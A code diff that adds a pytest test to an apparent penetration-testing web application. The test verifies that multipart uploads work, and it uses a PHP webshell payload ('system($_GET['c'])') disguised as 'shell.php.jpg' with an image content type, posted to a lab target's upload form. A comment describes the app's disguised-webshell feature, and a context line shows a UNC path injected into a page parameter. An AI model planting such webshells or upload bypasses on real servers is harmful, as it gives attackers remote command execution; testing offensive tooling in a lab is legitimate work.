@@ -219,3 +219,62 @@ def test_a_query_string_typed_directly_into_the_url_survives_an_empty_query_json
     asyncio.run(send_once(db, request, {}))
 
     assert sent_urls == ["http://10.10.10.10/index.php?page=\\\\10.10.10.5\\test"]
+
+
+def test_multipart_body_mode_actually_uploads_a_file(tmp_path, monkeypatch):
+    # This app could already build a disguised-as-an-image webshell
+    # (ReverseShellPanel's webshell download) but had no way to actually
+    # POST it through an upload form -- body_mode only ever supported
+    # raw/json/x-www-form-urlencoded. multipart closes that gap.
+    import base64
+    import app.modules.web_testing.router as router
+
+    class Response:
+        status_code = 200
+        content = b"uploaded"
+        headers = {}
+        cookies = {}
+
+    captured = {}
+
+    class Client:
+        def __init__(self, **kwargs):
+            pass
+        async def __aenter__(self):
+            return self
+        async def __aexit__(self, *args):
+            return None
+        async def request(self, method, url, **kwargs):
+            captured["data"] = kwargs.get("data")
+            captured["files"] = kwargs.get("files")
+            return Response()
+
+    monkeypatch.setattr(router, "WORKSPACE_DIR", tmp_path)
+    monkeypatch.setattr(router.httpx, "AsyncClient", Client)
+    db = database()
+    project = Project(name="Web Lab", description="")
+    db.add(project); db.flush()
+    target = Target(project_id=project.id, name="Box", ip="10.10.10.10")
+    db.add(target); db.flush()
+    file_content = base64.b64encode(b"<?php system($_GET['c']); ?>").decode()
+    request = HttpRequest(
+        project_id=project.id, target_id=target.id, name="Avatar upload",
+        method="POST", url="http://10.10.10.10/cdn-cgi/upload.php",
+        body_mode="multipart",
+        body=json.dumps({
+            "fields": {"submit": "Upload"},
+            "files": [{"field": "avatar", "filename": "shell.php.jpg",
+                       "content_type": "image/jpeg", "content_b64": file_content}],
+        }))
+    db.add(request); db.commit()
+
+    exchange = asyncio.run(send_once(db, request, {}))
+
+    assert exchange.status_code == 200
+    assert captured["data"] == {"submit": "Upload"}
+    assert captured["files"]["avatar"] == (
+        "shell.php.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg")
+    # The raw base64 (the whole file) never lands in the stored snapshot --
+    # just enough to confirm what was sent without bloating it.
+    assert file_content not in exchange.request_snapshot
+    assert "shell.php.jpg" in exchange.request_snapshot
